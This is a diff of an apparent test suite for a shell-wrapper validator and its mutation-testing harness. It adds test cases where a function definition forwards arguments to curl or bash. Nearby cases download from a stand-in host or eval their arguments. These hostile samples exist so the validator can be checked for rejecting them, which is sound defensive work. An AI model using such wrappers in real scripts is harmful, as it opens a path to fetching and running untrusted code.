@@ -1830,6 +1830,8 @@ V = [
     c("the definition is indented", HEAD + "  " + DEF + ASG + CALL),
     c("the definition body downloads", HEAD + "ck() { curl -s https://e.example/x; }\n" + ASG + CALL),
     c("the definition body evals", HEAD + "ck() { eval \"$@\"; }\n" + ASG + CALL),
+    c("the definition forwards to a download tool", HEAD + "ck() { curl \"$@\"; }\n" + ASG + CALL),
+    c("the definition forwards to bash", HEAD + "ck() { bash \"$@\"; }\n" + ASG + CALL),
     c("the definition body runs its first argument", HEAD + "ck() { \"$@\"; }\n" + ASG + CALL),
     c("the definition body has a second command", HEAD + "ck() { y \"$@\"; curl -s https://e.example/x; }\n" + ASG + CALL),
     c("the definition body passes $@ unquoted", HEAD + "ck() { y $@; }\n" + ASG + CALL),
@@ -2264,7 +2266,7 @@ import sys
 s = open(sys.argv[1]).read(); assert s.count(sys.argv[3]) == 1, sys.argv[3]
 open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
 PY
-  python3 "$work/hf_enum.py" "$hcm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hcm/e.json" </dev/null
+  rm -f "$hcm/e.json"; python3 "$work/hf_enum.py" "$hcm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hcm/e.json" </dev/null
   CASE="AC16 harness code mutant: $what is caught (an unexpected acceptance, or a refusal for another reason)"
   check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hcm/e.json"
 done <<'EOF'
@@ -2401,7 +2403,7 @@ import sys
 s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
 open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
 PY
-  python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null; cp "$hfm/e.json" "$hfm/e-$what.json"
+  rm -f "$hfm/e.json"; python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null; cp "$hfm/e.json" "$hfm/e-$what.json"
   CASE="AC16 harness mutation: widening HARNESS_WHITELIST by one token ($what) is caught (an unexpected acceptance, or a refusal for another reason)"
   check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hfm/e.json"
   python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness mutation', sys.argv[2] + ':', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$hfm/e.json" "$what"
